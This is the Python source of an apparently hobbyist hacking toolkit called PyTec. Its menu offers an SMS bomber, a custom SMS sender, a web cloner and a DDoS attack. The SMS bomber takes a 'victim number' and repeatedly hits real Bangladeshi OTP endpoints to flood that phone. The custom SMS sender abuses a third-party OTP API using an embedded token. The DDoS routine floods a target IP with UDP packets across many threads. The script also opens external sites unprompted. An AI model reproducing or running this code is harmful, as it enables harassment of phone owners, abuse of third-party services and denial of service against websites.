import os
import time
import requests

# rendom module use kore ans gulu ke sajate pari


try:
    iP = requests.get("http://ip-api.com/json/").json()["query"]
    mk = requests.get("http://ip-api.com/json/").json()["country"]
    if "Bangladesh" not in mk:
       print("\033[1;91m[×] THIS TOOL WORK IN BANGLADESH")
       time.sleep(3)
       exit()
except requests.exceptions.ConnectionError:
    print(f"\033[1;91m[×] Connection Problem, Please Check Your Internet And Run Again")
    time.sleep(3)
    os.system("clear")
    exit()



try:
    import requests
except ImportError:
    print('\n  installing Requests ...\n')
    time.sleep(1)
    os.system('pip install requests')

# try:
#     import pyttsx3
# except ImportError:
#     print('\n  installing pyttsx3 ...\n')
#     time.sleep(1)
#     os.system('pip install pyttsx3')

# try:
#     import pyautogui
# except ImportError:
#     print('\n  installing pyautogui...\n')
#     time.sleep(1)
#     os.system('pip install pyautogui')

try:
    import qrcode
except ImportError:
    print('\n  installing qrcode ...\n')
    time.sleep(1)
    os.system('pip install qrcode')

try:
    import pyshorteners
except ImportError:
    print('\n  installing pyshorteners ...\n')
    time.sleep(1)
    os.system('pip install pyshorteners')


# try:
#     import speech_recognition
# except ImportError:
#     print('\n  installing SpeechRecognition ...\n')
#     time.sleep(1)
#     os.system('pip install SpeechRecognition')
#     pass

def rm():
    com("rm -rf PyTec.py")

# try:
#     import pywhatkit
# except ImportError:
#     print('\n installing pywhatkit...')
#     time.sleep(1)
#     os.system('pip install pywhatkit')


#import pyttsx3
# import speech_recognition as sr
import sys
from os import system as com
from time import sleep as sleep
import time
#import pyautogui as gui
import pyshorteners as st
import random
import json
import  requests as re
# import pywhatkit



#==================for Color Code===============
BLK = "\033[0;30m"
RED = "\033[0;31m"
GRN = "\033[0;32m"
YLW = "\033[0;33m"
BLU = "\033[0;34m"
PRP = "\033[0;35m"
CYN = "\033[0;36m"
WHT = "\033[0;37m"

B_BLK = "\033[1;30m"
B_RED = "\033[1;31m"
B_GRN = "\033[1;32m"
B_YLW = "\033[1;33m"
B_BLU = "\033[1;34m"
B_PRP = "\033[1;35m"
B_CYN = "\033[1;36m"
B_WHT = "\033[1;37m"
t="\t" #for tab
r="\033[1;31m" #for red color  
g="\033[1;32m" #for green color
y="\033[1;33m" #for yellow color
b="\033[1;34m" #for blue color
m="\033[1;35m" #for purple color
c="\033[1;36m" #for cyan color
w="\033[1;37m" #for white color


# Random Function

list1 = [GRN, YLW, BLU, PRP, CYN, WHT]
list2 = [B_GRN, B_YLW, B_BLU, B_PRP, B_CYN, B_WHT]
ran = str(random.choice(list1))
ran2 = str(random.choice(list2))

tim = time.strftime("%H:%M:%S") # current time



#==============animation for============#
def axak(xak):
    for x in xak:
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.005)
def xak(xak):
    for x in xak+"\n":
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.010)
def xak2(xak):
    for x in xak+"\n":
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.07)
def animation_ban(xak):
    for x in xak+"\n":
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.002)





#++++++++++++++++++++Tools menu++++++++++++++++++
menu_logo = (f"""{ran2}
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║                                                       ║
║        ██████╗░██╗░░░██╗████████╗███████╗░█████╗░     ║
║        ██╔══██╗╚██╗░██╔╝╚══██╔══╝██╔════╝██╔══██╗     ║
║        ██████╔╝░╚████╔╝░░░░██║░░░█████╗░░██║░░╚═╝     ║
║        ██╔═══╝░░░╚██╔╝░░░░░██║░░░██╔══╝░░██║░░██╗     ║
║        ██║░░░░░░░░██║░░░░░░██║░░░███████╗╚█████╔╝     ║
║        ╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░╚══════╝░╚════╝░     ║
║                                                       ║
╠═══════════════════════════════════════════════════════╣
║                                                       ║
║   [1] 🚀 MK SMS BOMBER (Updating)                    ║
║   [2] 📷 QR Code Generator                           ║
║   [3] 🔗 URL Shortener                               ║
║   [4] ✉️ Custom SMS (Updating)                       ║
║   [5] 🌐 Web Cloner                                  ║
║   [6] 💥 DDoS Attack                                 ║
║   [7] 🔍 Admin Panel Finder                          ║
║   [0] ❌ Exit                                        ║
║                                                       ║
╚═══════════════════════════════════════════════════════╝
""")
com("xdg-open http://mk777.rf.gd/?i=1")













# ==================Only for Banner===================

def pytec():
    com("clear")
    xak(f"""{ran2}
    ╔═══════════════════════════════════════════════════════╗
    ║                                                       ║
    ║                                                       ║
    ║        ██████╗░██╗░░░██╗████████╗███████╗░█████╗░     ║
    ║        ██╔══██╗╚██╗░██╔╝╚══██╔══╝██╔════╝██╔══██╗     ║
    ║        ██████╔╝░╚████╔╝░░░░██║░░░█████╗░░██║░░╚═╝     ║
    ║        ██╔═══╝░░░╚██╔╝░░░░░██║░░░██╔══╝░░██║░░██╗     ║
    ║        ██║░░░░░░░░██║░░░░░░██║░░░███████╗╚█████╔╝     ║
    ║        ╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░╚══════╝░╚════╝░     ║
    ║                                                       ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    





def sms_bomber_ban():
    com("clear")
    xak(f"""\n{ran2}
    ██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
    ██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
    ██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝
    ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
    ██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
    ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝ 
    """ )
    animation_ban(f"""{ran}
    ╔═══════════════════════════════════════════════════╗
    ║                                                   ║
    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★      ║
    ║  🔧  TOOLS      ➟  𝑺𝑴𝑺 𝑩𝒐𝒎𝒃𝒆𝒓                   ║
    ║  🛠️  VERSION    ➟  V 1.0                         ║
    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1       ║
    ║                                                   ║
    ╚═══════════════════════════════════════════════════╝
        """ )
    

def qr_code_ban():
    com("clear")
    xak(f"""\n{ran2}
        
    ╭━━━┳━━━╮╭━━━╮╱╱╱╱╭╮
    ┃╭━╮┃╭━╮┃┃╭━╮┃╱╱╱╱┃┃
    ┃┃╱┃┃╰━╯┃┃┃╱╰╋━━┳━╯┣━━╮
    ┃┃╱┃┃╭╮╭╯┃┃╱╭┫╭╮┃╭╮┃┃━┫
    ┃╰━╯┃┃┃╰╮┃╰━╯┃╰╯┃╰╯┃┃━┫
    ╰━━╮┣╯╰━╯╰━━━┻━━┻━━┻━━╯
    ╱╱╱╰╯
    """ )
    animation_ban(f"""{ran}
    ╔═══════════════════════════════════════════════════╗
    ║                                                   ║
    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★      ║
    ║  🔧  TOOLS      ➟  𝓠𝓡 𝓒𝓸𝓭𝓮 𝓖𝓮𝓷𝓪𝓻𝓮𝓽𝓸𝓻            ║
    ║  🛠️  VERSION    ➟  V 1.0                         ║
    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1       ║
    ║                                                   ║
    ╚═══════════════════════════════════════════════════╝
        """ )
    
def url_shortener_ban():
    com("clear")
    xak(f"""\n{ran2}
    
    ╔╗ ╔╗ ╔╗   ╔═══╦╗      ╔╗
    ║║ ║║ ║║   ║╔═╗║║     ╔╝╚╗
    ║║ ║╠═╣║   ║╚══╣╚═╦══╦╩╗╔╬══╦═╗
    ║║ ║║╔╣║ ╔╗╚══╗║╔╗║╔╗║╔╣║║║═╣╔╝
    ║╚═╝║║║╚═╝║║╚═╝║║║║╚╝║║║╚╣║═╣║
    ╚═══╩╝╚═══╝╚═══╩╝╚╩══╩╝╚═╩══╩╝
    """)
    animation_ban(f"""{ran}
    ╔═══════════════════════════════════════════════════╗
    ║                                                   ║
    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★      ║
    ║  🔧  TOOLS      ➟  𝐔𝐫𝐋 𝐒𝐡𝐨𝐫𝐭𝐞𝐫                    ║
    ║  🛠️  VERSION    ➟  V 1.0                         ║
    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1       ║
    ║                                                    ║
    ╚════════════════════════════════════════════════════╝
        """ )

def custom_sms_ban():
    com("clear")
    xak(f"""\n{ran2}
        
    ╭━━━╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━━┳━╮╭━┳━━━╮
    ┃╭━╮┃╱╱╱╱╭╯╰╮╱╱╱╱╱╱┃╭━╮┃┃╰╯┃┃╭━╮┃
    ┃┃╱╰╋╮╭┳━┻╮╭╋━━┳╮╭╮┃╰━━┫╭╮╭╮┃╰━━╮
    ┃┃╱╭┫┃┃┃━━┫┃┃╭╮┃╰╯┃╰━━╮┃┃┃┃┃┣━━╮┃
    ┃╰━╯┃╰╯┣━━┃╰┫╰╯┃┃┃┃┃╰━╯┃┃┃┃┃┃╰━╯┃
    ╰━━━┻━━┻━━┻━┻━━┻┻┻╯╰━━━┻╯╰╯╰┻━━━╯
    """)
    animation_ban(f"""{ran}
    ╔═════════════════════════════════════════════════╗
    ║                                                 ║
    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★    ║
    ║  🔧  TOOLS      ➟  𝓒𝓾𝓼𝓽𝓸𝓶 𝓢𝓜𝓢                ║
    ║  🛠️  VERSION    ➟  V 1.0                      ║
    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1    ║
    ║                                                ║
    ╚════════════════════════════════════════════════╝
        """ )

def web_cloner_ban():
    com("clear")
    xak(f"""\n{ran2}
        
    ╭╮╭╮╭╮╱╱╭╮╱╭━━━┳╮
    ┃┃┃┃┃┃╱╱┃┃╱┃╭━╮┃┃
    ┃┃┃┃┃┣━━┫╰━┫┃╱╰┫┃╭━━┳━╮╭━━┳━╮
    ┃╰╯╰╯┃┃━┫╭╮┃┃╱╭┫┃┃╭╮┃╭╮┫┃━┫╭╯
    ╰╮╭╮╭┫┃━┫╰╯┃╰━╯┃╰┫╰╯┃┃┃┃┃━┫┃
    ╱╰╯╰╯╰━━┻━━┻━━━┻━┻━━┻╯╰┻━━┻╯
    """)
    animation_ban(f"""{ran}
    ╔═══════════════════════════════════════════════════╗
    ║                                                   ║
    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★      ║
    ║  🔧  TOOLS      ➟  𝓦𝓮𝓫 𝓒𝓵𝓸𝓷𝓮𝓻                  ║
    ║  🛠️  VERSION    ➟  V 1.0                        ║
    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1      ║
    ║                                                  ║
    ╚══════════════════════════════════════════════════╝
        """ )

def ddos_attack_ban():
    com("clear")
    xak(f"""\n {ran2}
        
    ██████╗░██████╗░░█████╗░░██████╗
    ██╔══██╗██╔══██╗██╔══██╗██╔════╝
    ██║░░██║██║░░██║██║░░██║╚█████╗░
    ██║░░██║██║░░██║██║░░██║░╚═══██╗
    ██████╔╝██████╔╝╚█████╔╝██████╔╝
    ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
        """)
    animation_ban(f"""{ran}
    ╔══════════════════════════════════════════════════╗
    ║                                                  ║
    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★     ║
    ║  🔧  TOOLS      ➟  𝐀𝐔𝐓𝐎 𝐃𝐃𝐨𝐒 𝐛𝐲 𝐏𝐲𝐓𝐞𝐜🔥          ║
    ║  🛠️  VERSION    ➟  V 1.0                        ║
    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1      ║
    ║                                                  ║
    ╚══════════════════════════════════════════════════╝
        """ )
    
          

def admin_panel_finder_ban():
    com("clear")
    xak(f"""\n{ran2}
    █████╗ ██████╗ ███╗   ███╗██╗███╗   ██╗██████╗ ███████╗
    ██╔══██╗██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗██╔════╝
    ███████║██║  ██║██╔████╔██║██║██╔██╗ ██║██████╔╝█████╗  
    ██╔══██║██║  ██║██║╚██╔╝██║██║██║╚██╗██║██╔═══╝ ██╔══╝  
    ██║  ██║██████╔╝██║ ╚═╝ ██║██║██║ ╚████║██║     ██║     
    ╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝                                                       
    """)
    animation_ban(f"""{ran}
    ╔═══════════════════════════════════════════════════╗
    ║                                                   ║
    ║  🌐  OWNER      ➟  ★彡[𝐌𝐔𝐒𝐋𝐈𝐌 𝐔𝐃𝐃𝐈𝐍 𝐌𝐊]彡★   ║
    ║  🔧  TOOLS      ➟  𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞𝐥 𝐅𝐢𝐧𝐝𝐞𝐫            ║
    ║  🛠️  VERSION    ➟  V 1.0                         ║
    ║  🌐  WEBSITE    ➟  http://mk777.rf.gd/?i=1       ║
    ║                                                   ║
    ╚═══════════════════════════════════════════════════╝
        """)










#===================BOMBER TOOLS=======================

def sms_bomber():
  com("clear")
  sms_bomber_ban()
  xak(f"{ran2} 𝐒𝐨𝐫𝐫𝐲, 𝐓𝐡𝐢𝐬 𝐓𝐨𝐨𝐥 𝐢𝐬 𝐧𝐨𝐭 𝐰𝐨𝐫𝐤𝐢𝐧𝐠 𝐫𝐢𝐠𝐡𝐭 𝐧𝐨𝐰. 𝐓𝐡𝐢𝐬 𝐢𝐬 𝐜𝐮𝐫𝐫𝐞𝐧𝐭𝐥𝐲 𝐛𝐞𝐢𝐧𝐠 𝐮𝐩𝐝𝐚𝐭𝐞𝐝.")
  xak2(f"{ran} 𝐖𝐞 𝐚𝐫𝐞 𝐛𝐚𝐜𝐤 𝐭𝐨 𝐦𝐞𝐧𝐮.")
  menu()
  print(WHT+"[~] please wait Internet checking...  ")
  time.sleep(2)
  try:
    iP = requests.get("http://ip-api.com/json/").json()["query"]
    mk = requests.get("http://ip-api.com/json/").json()["country"]
    if "Bangladesh" not in mk:
       print("\033[1;91m[×] THIS TOOL WORK IN BANGLADESH")
       time.sleep(3)
       exit()
  except requests.exceptions.ConnectionError:
    print(f"\033[1;91m[×] Connection Problem, Please Check Your Internet And Run Again")
    time.sleep(3)
    com("clear")
    exit()
  com('clear')
  print(WHT+"[~] Connecting To The Internet")
  time.sleep(0.30)
  print(f"\n{r}Note : {WHT}1 Sms Can Sent Up To 18 sms !!")
  try:
   request = requests.get("https://www.google.com/", timeout=2)
   print("\n\033[1;37m[\033[1;32m#\033[1;37m]"+"\033[1;32m Connetcted ")
  except (requests.ConnectionError, requests.Timeout) as exception:
   print("\n\033[1;37m[\033[1;32m#\033[1;37m] \033[1;31mðŸ˜¢ Your Internet Connection Is Poor !")
  number=input(f"{c}\n[ VICTIM NUMBER ] :{WHT} +88")
  amount=int(input(c+"\n[ AMOUNT ] : "+WHT))
  xak(f"\n\n\t {WHT}<{r}/{WHT}> {g}STAY WITH Mk-777 ;) {WHT}<{r}/{WHT}>\n\n")
  input(f"\t\t\t{r}Press Enter....")
  com("clear")
  url0 = "http://apibeta.iqra-live.com/api/v1/sent-otp/"+number
  urlf = "https://da-api.robi.com.bd/da-nll/otp/send"
  headersf = {
              "Host": "da-api.robi.com.bd",
              "Connection": "keep-alive",
              "Content-Length": "24",
              "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Android WebView";v="122"',
              "Accept": "application/json, text/plain, */*",
              "Content-Type": "application/json",
              "sec-ch-ua-mobile": "?1",
              "User-Agent": "Mozilla/5.0 (Linux; Android 11; Phh-Treble vanilla Build/RQ3A.211001.001;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Safari/537.36",
              "sec-ch-ua-platform": '"Android"',
              "Origin": "https://onlinesim.robi.com.bd",
              "X-Requested-With": "mark.via.gp",
              "Sec-Fetch-Site": "same-site",
              "Sec-Fetch-Mode": "cors",
              "Sec-Fetch-Dest": "empty",
              "Referer": "https://onlinesim.robi.com.bd/",
              "Accept-Encoding": "gzip, deflate, br, zstd",
              "Accept-Language": "en-US,en;q=0.9",
          }
  dataf= {"msisdn": number}
  
  
  random_alphabet = random.choice('abcdefghijklmnopqrstuvwxyz')
  urlg = "https://meenabazardev.com/api/front/send/otp"
  headersg = ({
              "Host": "meenabazardev.com",
              "accept": "*/*",
              "access-control-request-method": "POST",
              "access-control-request-headers": "authorization,content-type,token",
              "origin": "https://meenabazaronline.com",
              "user-agent": "Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.45 Mobile Safari/537.36",
              "sec-fetch-mode": "cors",
              "x-requested-with": "mark.via.gp",
              "sec-fetch-site": "cross-site",
              "sec-fetch-dest": "empty",
              "referer": "https://meenabazaronline.com/",
              "accept-encoding": "gzip, deflate, br",
              "accept-language": "en-US,en;q=0.9",
              "Content-Type": "application/json",
          })
  datag = json.dumps({
              "CellPhone": number,
              "type": random_alphabet
          })
  
  urlgov = "https://training.gov.bd/backoffice/api/user/sendOtp"
  
  hedagov = {
              "Host": "training.gov.bd",
              "Connection": "keep-alive",
              "Content-Type": "application/json",
              "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
              "Origin": "https://training.gov.bd",
              "Referer": "https://training.gov.bd/signup",
              "Accept-Encoding": "gzip, deflate, br",
              "Accept-Language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7"
          }
  datagov = json.dumps({
              "mobile": number
          })
  
  
  urlshop = 'https://eshop-api.banglalink.net/api/v1/customer/send-otp'
  hedashop = {
              'Host': 'eshop-api.banglalink.net',
              'Connection': 'keep-alive',
              'Content-Length': '38',
              'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
              'sec-ch-ua-platform': '"Android"',
              'sec-ch-ua-mobile': '?1',
              'User-Agent': 'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
              'Content-Type': 'application/json',
              'Accept': '*/*',
              'Origin': 'https://eshop.banglalink.net',
              'X-Requested-With': 'mark.via.gp',
              'Sec-Fetch-Site': 'same-site',
              'Sec-Fetch-Mode': 'cors',
              'Sec-Fetch-Dest': 'empty',
              'Referer': 'https://eshop.banglalink.net/',
              'Accept-Encoding': 'gzip, deflate, br',
              'Accept-Language': 'en-US,en;q=0.9',
          }
  datashop = json.dumps({
              'type': 'phone',
              'phone': number
          })
  
  com("xdg-open https://www.facebook.com/profile.php?id=100077752513671")
  print(f"""\n{ran2}                                                               
  $$\\      $$\\ $$\\   $$\\       $$$$$$$\\   $$$$$$\\  $$\\      $$\\ $$$$$$$\\  
  $$$\\    $$$ |$$ | $$  |      $$  __$$\\ $$  __$$\\ $$$\\    $$$ |$$  __$$\\ 
  $$$$\\  $$$$ |$$ |$$  /       $$ |  $$ |$$ /  $$ |$$$$\\  $$$$ |$$ |  $$ |
  $$\\$$\\$$ $$ |$$$$$  /        $$$$$$$\\ |$$ |  $$ |$$\\$$\\$$ $$ |$$$$$$$\\ |
  $$ \\$$$  $$ |$$  $$<         $$  __$$\\ $$ |  $$ |$$ \\$$$  $$ |$$  __$$\\ 
  $$ |\\$  /$$ |$$ |\\$$\\        $$ |  $$ |$$ |  $$ |$$ |\\$  /$$ |$$ |  $$ |
  $$ | \\_/ $$ |$$ | \\$$\\       $$$$$$$  | $$$$$$  |$$ | \\_/ $$ |$$$$$$$  |
  \\__|     \\__|\\__|  \\__|      \\_______/  \\______/ \\__|     \\__|\\_______/ 
    """)
  print(f"\n\t      {ran},----------------------------------,")
  print(f"\t{WHT}      | {RED}    AMOUNT ({g}{amount}{RED}){WHT} |   {RED}   TIME       {WHT}|")
  print(f"\t      {ran}'----------------------------------'")
  for i in range(amount):
    respf = requests.post(urlf, headers=headersf, json=dataf)
    print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥MK-777🔥 "+WHT+tim)
    respg = requests.post(urlg, headers=headersg, json=datag)
    print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥MK-777🔥 "+WHT+tim)
    resp0 = requests.get(url0)
    print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥MK-777🔥 "+WHT+tim)
    respgov = requests.post(urlgov, headers=hedagov, json=datagov)
    print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥MK-777🔥 "+WHT+tim)
    respshop = requests.post(urlshop, headers=hedashop, json=datashop)
    print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥MK-777🔥 "+WHT+tim)

  else: 
    input(g+"\n\n\t\t\tYour Pogram Finished Press Enter For Continue")
    





def qr_code():
    com("clear")
    qr_code_ban()

    name = input(f"{ran2}Type QRCode Name: ")
    data = input(f"{ran2}Type Data For Generate QRCode: ")

    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_H,
        box_size=20,
        border=7,
    )
    qr.add_data(data)
    qr.make(fit=True)
    make = qr.make_image(fill="green", back_color="lightgreen")
    make.save(f'{name}--PyTec.png')
    print(f"Your input Data:> {data}")
    print("Successfully saved")
    input("\n\n\t\t\tYour Program Finished. Press Enter To Continue")
    com("clear")
    qr_code()





def url_shortner():
    com("clear")
    url_shortener_ban()

    try:
        urlshort = input(str("ℙ𝕒𝕤𝕥 𝕐𝕠𝕦𝕣 𝕌𝕣𝕝 ℍ𝕖𝕣𝕖 : "))
        if not urlshort.startswith("http://") and not urlshort.startswith("https://"):
            print(f"{r}Invalid URL! Please include 'http://' or 'https://'.")
            return

        shorturl = st.Shortener().tinyurl.short(urlshort)
        print(f"\n{g}𝘠𝘰𝘶𝘳 𝘚𝘩𝘰𝘳𝘵 𝘜𝘳𝘭 𝘏𝘦𝘳𝘦: {shorturl}")
    except Exception as e:
        print(f"{r}An error occurred: {e}")
    finally:
        input(g + "\n\n\t\t\tYour Program Finished. Press Enter To Continue...")
        com("clear")
        url_shortner()




def custom_sms():
    com("clear")
    custom_sms_ban()
    xak(f"{ran2} 𝐒𝐨𝐫𝐫𝐲, 𝐓𝐡𝐢𝐬 𝐓𝐨𝐨𝐥 𝐢𝐬 𝐧𝐨𝐭 𝐰𝐨𝐫𝐤𝐢𝐧𝐠 𝐫𝐢𝐠𝐡𝐭 𝐧𝐨𝐰. 𝐓𝐡𝐢𝐬 𝐢𝐬 𝐜𝐮𝐫𝐫𝐞𝐧𝐭𝐥𝐲 𝐛𝐞𝐢𝐧𝐠 𝐮𝐩𝐝𝐚𝐭𝐞𝐝.")
    xak2(f"{ran} 𝐖𝐞 𝐚𝐫𝐞 𝐛𝐚𝐜𝐤 𝐭𝐨 𝐦𝐞𝐧𝐮.")
    menu()

    urlsms = "https://badhan-api.stylezworld.net/api/otp/store"
    headers = {
        "user-agent": "Dart/3.1 (dart:io)",
        "access-control-allow-credentials": "true",
        "access-control-allow-headers": "Origin,Content-Type,X-Amz-Date,Authorization,X-Api-Key,X-Amz-Security-Token,locale",
        "accept": "application/json",
        "access-control-allow-origin": "*",
        "access-control-allow-methods": "POST, OPTIONS",
        "accept-encoding": "gzip",
        "app-access-token": "mWR+64IbKwxM2XCyJbMvUSCcc=",
        "content-type": "application/json; charset=utf-8",
    }

    while True:
        numsms = str(input(f"\n{g}Enter Victime Number \n \n{WHT}NUMBER {r}=>{y} "))
        sms = str(input(f"\n{g}Write Message \n \n{WHT}MESSEGE {r}=>{y} "))
        data = {
            "phone_number": numsms,                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
            "registration_phone_number": numsms,
            "auto_fill": sms
        }
        response = requests.post(urlsms, headers=headers, json=data)
        print("\n", response.json(), "\n\n")
        input(g + "\n\n\t\t\tYour Program Finished. Press Enter To Continue...")
        com("clear")
        url_shortner()




def web_clone():
    com("clear")
    web_cloner_ban()

    url = input("𝐄𝐧𝐭𝐞𝐫 𝐔𝐫𝐥 𝐎𝐟 𝐓𝐚𝐫𝐠𝐞𝐭 𝐖𝐞𝐛𝐬𝐢𝐭𝐞: ")
    response = re.get(url)

    html = response.text
    css = response.text
    javascript = response.text
    print(html)
    print(css)
    print(javascript)
    input(g + "\n\n\t\t\tYour Program Finished. Press Enter To Continue...")
    com("clear")
    web_clone()





def ddos():
    com("clear")
    ddos_attack_ban()
    xak(f"""\n{ran2} 𝐈 𝐡𝐚𝐯𝐞 𝐭𝐰𝐨 𝐃𝐃𝐎𝐒 𝐭𝐨𝐨𝐥𝐬. 𝐒𝐞𝐥𝐞𝐜𝐭 𝐭𝐡𝐞 𝐭𝐨𝐨𝐥 𝐲𝐨𝐮 𝐩𝐫𝐞𝐟𝐞𝐫. 
            [𝟏] 𝐌𝐞𝐝𝐢𝐮𝐦 𝐋𝐞𝐯𝐞𝐥
            [𝟐] 𝐇𝐢𝐠𝐡 𝐋𝐞𝐯𝐞𝐥
        """)
    choice = input(f"{ran2}Select Option: ")
    if choice == "1":
        ddos_midium()
    elif choice == "2":
        ddos_high()
    else:
        print(f"{r}Invalid choice. Please select 1 or 2.")
        ddos()
    input(g + "\n\n\t\t\tYour Program Finished. Press Enter To Continue...")






def ddos_midium():
    com("clear")
    import os
    import socket
    import threading
    import random
    import time
    from urllib.parse import urlparse
    from datetime import datetime

    # 🌈 Colors
    red = "\033[91m"
    green = "\033[92m"
    cyan = "\033[96m"
    yellow = "\033[93m"
    reset = "\033[0m"

    def loading(message, dots=3, delay=0.4):
        print(f"{yellow}{message}", end="", flush=True)
        for _ in range(dots):
            print(".", end="", flush=True)
            time.sleep(delay)
        print(reset)

    # 🔰 Clear & Banner
    os.system("clear" if os.name == "posix" else "cls")
    ddos_attack_ban()

    # 🌐 Step 1: Input website
    target_url = input(f"{cyan}[?] Enter Website URL (e.g., https://example.com): {reset}")
    loading("Parsing URL")

    # 🌍 Step 2: Extract domain and get IP
    domain = urlparse(target_url).netloc or urlparse(target_url).path
    loading(f"Resolving IP for {domain}")
    try:
        ip = socket.gethostbyname(domain)
        print(f"{green}[+] Target IP: {ip}{reset}")
    except Exception as e:
        print(f"{red}[!] Failed to resolve IP: {e}{reset}")
        exit()

    # 🔌 Step 3: Detect Port
    default_port = 443 if "https" in target_url else 80
    print(f"{green}[+] Using Port: {default_port}{reset}")
    time.sleep(1)

    # 🧠 Step 4: User config
    threads = int(input(f"{cyan}[?] Number of Threads (Recommended: 100): {reset}"))
    loading("Starting attack engine")

    # 💥 DDoS Attack + Live Counter
    attack_counter = 0
    lock = threading.Lock()
    start_time = datetime.now()

    def attack():
        global attack_counter
        data = random._urandom(1024)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                s.sendto(data, (ip, default_port))
                with lock:
                    attack_counter += 1
            except Exception:
                break

    def live_status():
        while True:
            time.sleep(1)
            elapsed = datetime.now() - start_time
            with lock:
                print(f"{cyan}[~] Sent packets: {attack_counter} | Time Elapsed: {elapsed.seconds}s{reset}", end="\r",
                      flush=True)

    print(f"{red}[*] Attacking {ip}:{default_port} with {threads} threads!{reset}")
    time.sleep(1)

    status_thread = threading.Thread(target=live_status, daemon=True)
    status_thread.start()

    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.start()



def ddos_high():
    ddos_attack_ban()
    animation_ban(f"{ran} 𝐓𝐡𝐢𝐬 𝐢𝐬 𝐚 𝐩𝐨𝐰𝐞𝐫𝐟𝐮𝐥 𝐭𝐨𝐨𝐥. 𝐈𝐭 𝐢𝐬 𝐧𝐨𝐭 𝐩𝐨𝐬𝐬𝐢𝐛𝐥𝐞 𝐭𝐨 𝐫𝐮𝐧 𝐭𝐡𝐢𝐬 𝐭𝐨𝐨𝐥 𝐰𝐢𝐭𝐡𝐨𝐮𝐭 𝐩𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧. 𝐈𝐟 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭, 𝐲𝐨𝐮 𝐜𝐚𝐧 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐡𝐞 𝐜𝐫𝐞𝐚𝐭𝐨𝐫 𝐨𝐟 𝐭𝐡𝐞 𝐭𝐨𝐨𝐥.")
    animation_ban(f"{ran} 𝐈 𝐜𝐚𝐧 𝐡𝐞𝐥𝐩 𝐲𝐨𝐮 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐡𝐞 𝐜𝐫𝐞𝐚𝐭𝐨𝐫. 𝐀𝐫𝐞 𝐲𝐨𝐮 𝐢𝐧𝐭𝐞𝐫𝐞𝐬𝐭𝐞𝐝 𝐢𝐧 𝐜𝐨𝐧𝐭𝐚𝐜𝐭𝐢𝐧𝐠?")
    choice = input(f"{ran2}Do you want to contact the creator? (y/n): ")
    if choice.lower() == 'y':
        print(f"{ran2}Contacting the creator...")
        time.sleep(2)
